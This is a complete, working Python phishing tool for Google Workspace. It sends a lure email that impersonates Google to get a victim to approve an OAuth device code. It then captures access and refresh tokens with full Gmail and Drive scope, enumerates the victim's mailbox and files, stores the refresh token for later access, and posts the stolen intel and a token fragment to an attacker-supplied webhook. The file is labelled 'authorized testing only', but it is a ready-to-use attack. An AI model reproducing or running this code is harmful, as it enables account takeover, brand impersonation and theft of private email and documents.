#!/usr/bin/env python3
"""
gphish.py — Google Workspace Device Code Phishing CLI (authorized testing only)

  python3 gphish.py run --client-id XXX.apps.googleusercontent.com \
      [--victim victim@target.com --smtp-user you@x.com --smtp-pass 'pw' \
       --webhook https://discord.com/api/webhooks/...]
  python3 gphish.py enum [--refresh-token 1//0aB...] [--webhook URL]
"""

import argparse, requests, time, json, smtplib, base64, sys, os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

STATE_FILE = "gphish_state.json"
SCOPES = [
    "https://www.googleapis.com/auth/userinfo.profile",
    "https://www.googleapis.com/auth/userinfo.email",
    "https://mail.google.com/",
    "https://www.googleapis.com/auth/drive",
]
DEVICE_URL = "https://oauth2.googleapis.com/device/code"
TOKEN_URL  = "https://oauth2.googleapis.com/token"

SCOPE_NAMES = {
    "https://mail.google.com/": "Full Gmail access",
    "https://www.googleapis.com/auth/drive": "Full Drive access",
    "https://www.googleapis.com/auth/userinfo.profile": "Profile",
    "https://www.googleapis.com/auth/userinfo.email": "Email address",
}

def get_device_code(client_id):
    r = requests.post(DEVICE_URL, data={
        "client_id": client_id, "scope": " ".join(SCOPES)})
    r.raise_for_status()
    d = r.json()
    print(f"[+] URL:   {d.get('verification_url', d.get('verification_uri'))}")
    print(f"[+] Code:  {d['user_code']}")
    return d

def send_lure(args, url, code):
    msg = MIMEMultipart()
    msg["From"] = f"Google Workspace <{args.smtp_user}>"
    msg["To"], msg["Subject"] = args.victim, \
        "New device sign-in — verification required"
    msg.attach(MIMEText(f"""
<html><body style="font-family:Roboto,Arial">
  <p>A new device attempted to access your Google Workspace account.
  Confirm it's you by entering this verification code:</p>
  <p style="font-size:28px;letter-spacing:4px"><b>{code}</b></p>
  <p><a href="{url}" style="background:#1a73e8;color:#fff;padding:10px 22px;
     text-decoration:none;border-radius:4px">Verify device</a></p>
  <p style="font-size:12px;color:#777">Google LLC</p>
</body></html>""", "html"))
    with smtplib.SMTP(args.smtp_host, 587) as s:
        s.starttls()
        s.login(args.smtp_user, args.smtp_pass)
        s.send_message(msg)
    print(f"[+] Lure sent to {args.victim}")

def poll_tokens(client_id, dev):
    interval = dev.get("interval", 5)
    while True:
        r = requests.post(TOKEN_URL, data={
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "client_id": client_id,
            "device_code": dev["device_code"]})
        body = r.json()
        if "access_token" in body:
            print("[!!!] TOKENS CAPTURED")
            return body
        err = body.get("error")
        if err == "authorization_pending":
            time.sleep(interval)
        elif err == "slow_down":
            interval += 5
            time.sleep(interval)
        elif err in ("expired_token", "access_denied"):
            print(f"[-] Flow ended: {err}")
            return None

def refresh_access_token(client_id, client_secret, rt):
    data = {"client_id": client_id, "grant_type": "refresh_token",
            "refresh_token": rt}
    if client_secret:
        data["client_secret"] = client_secret
    body = requests.post(TOKEN_URL, data=data).json()
    if "access_token" not in body:
        sys.exit(f"[-] Refresh failed: {body}")
    return body["access_token"]

def enumerate_access(at):
    h = {"Authorization": f"Bearer {at}"}
    intel = {}
    r = requests.get("https://www.googleapis.com/oauth2/v3/userinfo",
                     headers=h).json()
    intel["identity"] = {k: r.get(k) for k in ("email", "name", "hd")}
    print(f"[+] Victim: {r.get('email')} (hd: {r.get('hd', 'n/a')})")
    r = requests.get(
        "https://gmail.googleapis.com/gmail/v1/users/me/labels/INBOX", headers=h)
    intel["gmail"] = ({"accessible": True,
                       "messages": r.json().get("messagesTotal")}
                      if r.status_code == 200 else {"accessible": False})
    print(f"[{'+' if intel['gmail']['accessible'] else '-'}] Gmail: {intel['gmail']}")
    r = requests.get("https://www.googleapis.com/drive/v3/about"
                     "?fields=storageQuota", headers=h)
    if r.status_code == 200:
        q = r.json().get("storageQuota", {})
        files = requests.get("https://www.googleapis.com/drive/v3/files"
                             "?pageSize=10&fields=files(name)",
                             headers=h).json()
        intel["drive"] = {"accessible": True,
                          "used_gb": round(int(q.get("usage", 0)) / 1e9, 2),
                          "recent_files": [f["name"] for f in files.get("files", [])]}
    else:
        intel["drive"] = {"accessible": False}
    print(f"[{'+' if intel['drive']['accessible'] else '-'}] Drive: {intel['drive']}")
    intel["granted_scopes"] = requests.get(
        "https://oauth2.googleapis.com/tokeninfo",
        params={"access_token": at}).json().get("scope", "").split()
    for s in intel["granted_scopes"]:
        print(f"    • {s} -> {SCOPE_NAMES.get(s, 'unknown')}")
    return intel

def exfil_webhook(url, intel, at):
    requests.post(url, json={"content":
        "**[gPhish] Victim intel**\n"
        f"**Email:** {intel['identity'].get('email')}\n"
        f"**Gmail:** {intel['gmail'].get('accessible')} — "
        f"{intel['gmail'].get('messages', 'n/a')} msgs\n"
        f"**Drive:** {intel['drive'].get('accessible')}\n"
        f"**AT (trunc):** `{at[:25]}...`"})

def save_state(state):
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2)

def load_state():
    if not os.path.exists(STATE_FILE):
        sys.exit("[-] No state file — run 'run' first")
    with open(STATE_FILE) as f:
        return json.load(f)

def cmd_run(args):
    dev = get_device_code(args.client_id)
    if args.victim:
        send_lure(args, dev.get("verification_url",
                                dev.get("verification_uri")), dev["user_code"])
    tokens = poll_tokens(args.client_id, dev)
    if not tokens:
        return
    intel = enumerate_access(tokens["access_token"])
    save_state({"refresh_token": tokens.get("refresh_token"),
                "client_id": args.client_id,
                "client_secret": args.client_secret or "",
                "intel": intel})
    print(f"[+] State saved to {STATE_FILE}")
    if args.webhook:
        exfil_webhook(args.webhook, intel, tokens["access_token"])
        print("[+] Webhook notified")

def cmd_enum(args):
    st = load_state()
    rt = args.refresh_token or st.get("refresh_token")
    cid = args.client_id or st.get("client_id")
    if not rt:
        sys.exit("[-] No refresh token available")
    at = refresh_access_token(cid, st.get("client_secret", ""), rt)
    intel = enumerate_access(at)
    st["intel"] = intel
    save_state(st)
    if args.webhook:
        exfil_webhook(args.webhook, intel, at)

def main():
    p = argparse.ArgumentParser(description="gPhish — GW device code phishing")
    sub = p.add_subparsers(dest="cmd", required=True)
    r = sub.add_parser("run", help="initiate flow, lure, capture, enumerate")
    r.add_argument("--client-id", required=True)
    r.add_argument("--client-secret", default="")
    r.add_argument("--victim", help="victim email (omit to skip lure)")
    r.add_argument("--smtp-host", default="smtp.gmail.com")
    r.add_argument("--smtp-user")
    r.add_argument("--smtp-pass")
    r.add_argument("--webhook", default="")
    e = sub.add_parser("enum", help="re-enumerate using stored refresh token")
    e.add_argument("--refresh-token", default="")
    e.add_argument("--client-id", default="")
    e.add_argument("--webhook", default="")
    args = p.parse_args()
    {"run": cmd_run, "enum": cmd_enum}[args.cmd](args)

if __name__ == "__main__":
    main()
